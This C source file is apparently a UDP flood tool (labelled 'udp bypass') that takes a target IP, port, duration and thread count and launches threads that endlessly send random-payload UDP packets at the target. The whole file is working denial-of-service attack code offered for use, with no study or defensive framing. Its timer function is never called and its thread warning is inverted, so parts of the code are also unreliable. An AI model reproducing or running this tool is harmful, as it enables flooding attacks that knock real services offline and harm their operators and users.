#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#define MIN_PSIZE 128
#define MAX_PSIZE 768

//udp bypass or std hex written in c by juan aka george glaskin

typedef struct atk_args {
    in_addr_t host;

    int port, seconds, psize;
} args_t;

char characters[] = "abcdefghijklmnopqrstuvwxyz1234567890"; //characters used in random strings change if you want, size doesnt matter

static void atk_watch(int seconds) { //higher pps
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sleep(seconds);
        kill(getppid(), 9);
    }
}

static int random_int(int nMin, int nMax) {
    return rand() % ((nMax + 1) - nMin) + nMin;
}

static void random_str(char *string, int len) {
    while(len--)
        *string++ = characters[rand() % sizeof(characters)];
}

static void *atk_udpbypass(void *arg) {
    srand(time(NULL) ^ getpid());

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    args_t *args = (args_t *)arg;

    struct sockaddr_in addr = {
        .sin_addr.s_addr = args->host,
        .sin_port = htons(args->port),
        .sin_family = AF_INET
    };

    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    int len;
    char buf[MAX_PSIZE];

    while(1) {
        len = random_int(MIN_PSIZE, MAX_PSIZE);
        random_str(buf, len); //makes a random string, size based off of len generated

        send(sock, buf, len, MSG_NOSIGNAL);
    }
}

int main(int argc, char **argv) {
    if(argc != 5) {
        printf("Usage: invalid args!\r\n%s [ip] [port] [time] [threads]\r\nExample: %s 1.1.1.1 80 20 16\r\n", argv[0], argv[0]);

        return -1;
    }

    in_addr_t host;
    int port, seconds, threads;

    if(!(host = inet_addr(argv[1]))) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }
    else if((port = atoi(argv[2])) > 65535 || port < 1) {
        printf("[main] %s is invalid\r\n", argv[2]);

        return -1;
    }
    else if((seconds = atoi(argv[3])) < 1) {
        printf("[main] %s is invalid\r\n", argv[3]);

        return -1;
    }
    else if((threads = atoi(argv[4])) < 1) {
        printf("[main] %s is invalid\r\n", argv[1]);

        return -1;
    }

    if(threads < 200)
        puts("[warning] threads are high");

    args_t args = {
        .host = host,
        .port = port,
        .seconds = seconds
    };

    pthread_t thread[threads];
    
    for(int i = 0; i < threads; i++)
        pthread_create(&thread[i], NULL, atk_udpbypass, (void *)&args);
    
    printf("[main] started: %d threads\n", threads);

    while(1)
        sleep(1);
}
